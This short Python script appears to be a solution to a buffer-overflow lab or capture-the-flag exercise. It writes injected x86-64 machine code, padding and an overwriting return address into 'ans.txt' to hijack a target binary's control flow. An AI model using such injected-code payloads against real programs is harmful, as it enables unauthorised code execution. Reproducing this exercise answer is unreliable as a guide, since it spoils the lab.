machine_code = b"\xf3\x0f\x1e\xfa\xbf\x72\x00\x00\x00\x48\xb8\x16\x12\x40\x00\x00\x00\x00\x00\xff\xd0"
padding = b"\x00" * 19
return_address = b"\x34\x13\x40\x00\x00\x00\x00\x00"

payload = machine_code + padding + return_address
with open("ans.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")
